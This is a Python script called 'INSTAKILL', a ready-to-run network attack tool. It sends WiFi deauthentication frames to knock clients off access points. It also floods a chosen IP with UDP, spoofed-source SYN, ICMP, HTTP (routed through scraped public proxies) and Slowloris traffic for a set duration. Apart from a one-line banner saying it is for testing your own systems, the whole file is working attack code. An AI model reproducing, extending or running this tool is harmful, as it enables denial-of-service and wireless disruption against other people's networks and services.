#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#   INSTAKILL.py – Ultimate Network Killer (English version, no font issues)
#   Supports: Deauth (WiFi), IP DDoS (SYN/UDP/ICMP/HTTP/Slowloris)
#   Auto-detects OS, installs dependencies, runs on VPS and PC.
#   Usage: sudo python3 INSTAKILL.py   (Linux) or python INSTAKILL.py (Windows Admin)
#

import os
import sys
import time
import subprocess
import platform
import socket
import struct
import threading
import random
import re

# -------------------- CHECK & INSTALL DEPENDENCIES --------------------
def install_package(pkg):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False

try:
    import requests
except ImportError:
    print("[*] Installing requests...")
    install_package("requests")
    import requests

try:
    from scapy.all import *
except ImportError:
    print("[*] Installing scapy (required for deauth)...")
    install_package("scapy")
    from scapy.all import *

# -------------------- GLOBALS --------------------
sent_packets = 0
error_packets = 0
packet_lock = threading.Lock()
proxy_list = []
IS_WINDOWS = platform.system().lower() == 'windows'
IS_LINUX = platform.system().lower() == 'linux'
ADMIN = False

def check_admin():
    global ADMIN
    if IS_WINDOWS:
        try:
            import ctypes
            ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            ADMIN = False
    else:
        ADMIN = os.geteuid() == 0
    if not ADMIN:
        print("[!] Not admin/root. SYN and deauth will be disabled.")

check_admin()

# -------------------- HELPER: COUNT PACKETS --------------------
def count_packet(success=True):
    global sent_packets, error_packets
    with packet_lock:
        if success:
            sent_packets += 1
        else:
            error_packets += 1

# ==================== SECTION 1: DEAUTH (WIFI) ====================
def get_wifi_interface():
    if IS_WINDOWS:
        try:
            out = subprocess.check_output("netsh wlan show interfaces", shell=True, encoding='cp437')
            for line in out.splitlines():
                if "Name" in line and "Wi-Fi" in line:
                    return line.split(":")[1].strip()
        except:
            pass
        return "Wi-Fi"
    else:
        try:
            out = subprocess.check_output("iwconfig 2>/dev/null | grep -o '^[^ ]*'", shell=True, text=True)
            iface = out.splitlines()[0] if out else "wlan0"
            return iface
        except:
            return "wlan0"

def scan_wifi_netsh():
    try:
        out = subprocess.check_output("netsh wlan show networks mode=bssid", shell=True, encoding='cp437')
        networks = []
        current = {}
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("SSID"):
                ssid = line.split(":",1)[1].strip()
                current = {"ssid": ssid, "bssid": "", "signal": "", "channel": ""}
            elif "BSSID" in line and current:
                current["bssid"] = line.split(":",1)[1].strip()
            elif "Signal" in line and current:
                current["signal"] = line.split(":",1)[1].strip().replace("%","")
            elif "Channel" in line and current:
                current["channel"] = line.split(":",1)[1].strip()
                if current["bssid"] and current["signal"] and current["channel"]:
                    networks.append(current.copy())
        return networks
    except:
        return []

def scan_wifi_linux():
    networks = []
    try:
        iface = get_wifi_interface()
        subprocess.run(f"sudo iw dev {iface} scan | grep -E 'SSID:|BSS|signal|DS Parameter set'", shell=True, capture_output=True)
        # simpler: use airodump if available
        if subprocess.call("which airodump-ng", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
            cmd = f"sudo airodump-ng --band abg -w scan_tmp --output-format csv {iface}"
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(10)
            proc.terminate()
            try:
                with open("scan_tmp-01.csv", "r") as f:
                    for line in f:
                        if "ESSID" in line or "," not in line:
                            continue
                        parts = line.split(",")
                        if len(parts) >= 14:
                            bssid = parts[0].strip().strip('"')
                            channel = parts[3].strip().strip('"')
                            essid = parts[13].strip().strip('"')
                            signal = parts[8].strip().strip('"')
                            if bssid and essid and essid != "":
                                networks.append({"ssid": essid, "bssid": bssid, "channel": channel, "signal": signal})
                os.remove("scan_tmp-01.csv") if os.path.exists("scan_tmp-01.csv") else None
            except:
                pass
    except:
        pass
    return networks

def deauth_windows(iface, bssid, client="ff:ff:ff:ff:ff:ff"):
    try:
        pkt = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        print("[*] Sending deauth (Ctrl+C to stop)...")
        sendp(pkt, iface=iface, loop=1, inter=0.01, verbose=False)
    except Exception as e:
        print(f"[!] Deauth failed: {e}. Card may not support injection.")

def deauth_linux(bssid, iface="wlan0mon", client="ff:ff:ff:ff:ff:ff"):
    cmd = f"sudo aireplay-ng -0 0 -a {bssid} -c {client} {iface}"
    print("[*] Sending deauth with aireplay (Ctrl+C to stop)...")
    subprocess.run(cmd, shell=True)

def run_deauth():
    print("\n===== WIFI DEAUTH ATTACK =====")
    if IS_WINDOWS:
        iface = get_wifi_interface()
        print(f"[*] Using interface: {iface}")
        nets = scan_wifi_netsh()
        if not nets:
            print("[!] No networks found.")
            return
        for i, n in enumerate(nets):
            print(f"{i}: {n['ssid']} | {n['bssid']} | ch{n['channel']} | sig{n['signal']}%")
        choice = input("Select network number: ").strip()
        try:
            target = nets[int(choice)]
        except:
            print("[!] Invalid.")
            return
        bssid = target['bssid']
        client = input("Client MAC (blank for all): ").strip() or "ff:ff:ff:ff:ff:ff"
        deauth_windows(iface, bssid, client)
    else:
        iface = input("Monitor interface (e.g., wlan0mon): ").strip() or "wlan0mon"
        nets = scan_wifi_linux()
        if not nets:
            print("[!] No networks found. Try: sudo airmon-ng start wlan0")
            return
        for i, n in enumerate(nets):
            print(f"{i}: {n['ssid']} | {n['bssid']} | ch{n['channel']}")
        choice = input("Select network number: ").strip()
        try:
            target = nets[int(choice)]
        except:
            print("[!] Invalid.")
            return
        bssid = target['bssid']
        client = input("Client MAC (blank for all): ").strip() or "ff:ff:ff:ff:ff:ff"
        deauth_linux(bssid, iface, client)

# ==================== SECTION 2: IP DDOS ====================
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
]

def fetch_proxies():
    proxies = set()
    for url in PROXY_SOURCES:
        try:
            r = requests.get(url, timeout=8)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        if not line.startswith('http'):
                            line = f"http://{line}"
                        proxies.add(line)
        except:
            pass
    return list(proxies)

def udp_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1400)
    start = time.time()
    while time.time() - start < duration:
        try:
            sock.sendto(data, (ip, port))
            count_packet(True)
        except:
            count_packet(False)
    sock.close()

def syn_flood(ip, port, duration):
    if not ADMIN:
        print("[!] SYN needs admin, falling back to UDP.")
        udp_flood(ip, port, duration)
        return
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        start = time.time()
        while time.time() - start < duration:
            src = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            ip_hdr = struct.pack('!BBHHHBBH4s4s',
                69,0,40,random.randint(0,65535),0,255,6,0,
                socket.inet_aton(src), socket.inet_aton(ip))
            tcp_hdr = struct.pack('!HHLLBBHHH',
                random.randint(1024,65535), port,
                random.randint(0,2**32-1),0,80,2,65535,0,0)
            sock.sendto(ip_hdr + tcp_hdr, (ip, 0))
            count_packet(True)
        sock.close()
    except:
        count_packet(False)
        udp_flood(ip, port, duration)

def icmp_flood(ip, duration):
    if IS_WINDOWS:
        subprocess.Popen(f"ping -n 100000 -l 65500 {ip}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(duration)
        subprocess.call("taskkill /F /IM ping.exe", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        subprocess.Popen(f"ping -f -s 65500 {ip}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(duration)
        subprocess.call("pkill -f ping", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def http_flood(ip, port, proxy, duration):
    url = f"http://{ip}:{port}/"
    headers = {'User-Agent': random.choice(['Mozilla/5.0','Chrome','Firefox']), 'Cache-Control':'no-cache'}
    proxies = {'http': proxy, 'https': proxy} if proxy else None
    start = time.time()
    while time.time() - start < duration:
        try:
            requests.get(url, headers=headers, proxies=proxies, timeout=2)
            count_packet(True)
            requests.post(url, headers=headers, data={'x': random.randint(1,9999)}, proxies=proxies, timeout=2)
            count_packet(True)
        except:
            count_packet(False)

def slowloris(ip, port, duration):
    sockets = []
    start = time.time()
    while time.time() - start < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            s.send(b"GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n" % ip.encode())
            sockets.append(s)
            count_packet(True)
            time.sleep(0.1)
        except:
            count_packet(False)
    time.sleep(duration)
    for s in sockets:
        try: s.close()
        except: pass

def worker(ip, port, method, proxy, duration):
    if method == 'udp': udp_flood(ip, port, duration)
    elif method == 'syn': syn_flood(ip, port, duration)
    elif method == 'icmp': icmp_flood(ip, duration)
    elif method == 'http': http_flood(ip, port, proxy, duration)
    elif method == 'slow': slowloris(ip, port, duration)

def stats_loop(duration):
    global sent_packets, error_packets
    start = time.time()
    last_sent = 0
    last_time = start
    print("\n" + "="*70)
    print(f"{'Time (s)':<12} {'Success':<18} {'Errors':<12} {'Speed (pps)':<15} {'Proxies'}")
    print("="*70)
    while time.time() - start < duration:
        time.sleep(2)
        now = time.time()
        with packet_lock:
            s = sent_packets
            e = error_packets
        pps = (s - last_sent) / (now - last_time) if (now - last_time) > 0 else 0
        last_sent = s
        last_time = now
        print(f"{int(now-start):<6}s     {s:<18,} {e:<12,} {pps:<15,.0f} {len(proxy_list)}")
    print("="*70)

def run_ip_attack():
    global proxy_list
    print("\n===== IP DDOS ATTACK =====")
    target = input("Target IP: ").strip()
    if not target:
        print("[!] Empty.")
        return
    try:
        socket.inet_aton(target)
    except:
        print("[!] Invalid IP.")
        return
    port = int(input("Port (default 80, 0=random): ").strip() or "80")
    if port == 0:
        port = random.randint(1,65535)
    threads = int(input("Threads (default 200, max 500): ").strip() or "200")
    if threads > 500: threads = 500
    duration = int(input("Duration (seconds, default 60): ").strip() or "60")

    print("\nMethods: 1-UDP  2-SYN  3-ICMP  4-HTTP  5-Slowloris  6-ALL")
    m_choice = input("Choose (default 6): ").strip() or "6"
    m_map = {'1':'udp','2':'syn','3':'icmp','4':'http','5':'slow','6':'all'}
    method = m_map.get(m_choice, 'all')

    use_proxy = False
    if method in ['http', 'all']:
        use_proxy = input("Use proxy for HTTP? (y/n, default n): ").strip().lower() == 'y'
        if use_proxy:
            manual = input("Manual proxy (ip:port, comma sep) or leave blank for auto: ").strip()
            if manual:
                proxy_list = [f"http://{p.strip()}" if not p.startswith('http') else p.strip() for p in manual.split(',') if p.strip()]
            else:
                print("[*] Fetching proxies...")
                proxy_list = fetch_proxies()
                if not proxy_list:
                    print("[!] No proxies, attack without proxy.")
                    use_proxy = False
                else:
                    print(f"[+] Got {len(proxy_list)} proxies.")

    # Build method list
    if method == 'all':
        methods = ['udp','syn','icmp','http','slow']
        mlist = []
        for m in methods:
            mlist.extend([m] * (threads // len(methods)))
        while len(mlist) < threads:
            mlist.append(random.choice(methods))
        random.shuffle(mlist)
    else:
        mlist = [method] * threads

    proxy_iter = iter(proxy_list) if use_proxy and proxy_list else None
    thr = []
    for m in mlist:
        proxy = None
        if proxy_iter and m == 'http':
            try:
                proxy = next(proxy_iter)
            except StopIteration:
                proxy_iter = iter(proxy_list)
                proxy = next(proxy_iter)
        t = threading.Thread(target=worker, args=(target, port, m, proxy, duration))
        t.daemon = True
        t.start()
        thr.append(t)

    stats_t = threading.Thread(target=stats_loop, args=(duration,))
    stats_t.daemon = True
    stats_t.start()

    print(f"[*] Attacking {target}:{port} with {threads} threads for {duration}s. Ctrl+C to stop early.")
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print("\n[*] Stopped early.")
    print("[+] Attack finished.")

# ==================== MAIN MENU ====================
def main():
    print(r"""
╔═══════════════════════════════════════════════════════════╗
║   INSTAKILL – Ultimate Network Killer (English)          ║
║   (c) palofsc – For testing your own systems only        ║
╚═══════════════════════════════════════════════════════════╝
    """)
    print("1. Check WiFi card & env")
    print("2. Deauth attack (WiFi disconnect)")
    print("3. IP DDoS attack")
    choice = input("Choose (1-3): ").strip()
    if choice == '1':
        print("[*] Running checks...")
        print(f"OS: {platform.system()}")
        print(f"Admin: {ADMIN}")
        print(f"Interface: {get_wifi_interface()}")
        if IS_WINDOWS:
            try:
                out = subprocess.check_output("netsh wlan show drivers", shell=True, encoding='cp437')
                if "Monitor mode" in out:
                    print("[+] Monitor mode supported (maybe).")
                else:
                    print("[!] Monitor mode not supported.")
            except:
                print("[!] Could not check driver.")
        else:
            ret = subprocess.call("which aireplay-ng", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if ret == 0:
                print("[+] aircrack-ng installed.")
            else:
                print("[!] aircrack-ng not installed. Install: sudo apt install aircrack-ng")
    elif choice == '2':
        run_deauth()
    elif choice == '3':
        run_ip_attack()
    else:
        print("[!] Invalid.")

if __name__ == "__main__":
    main()
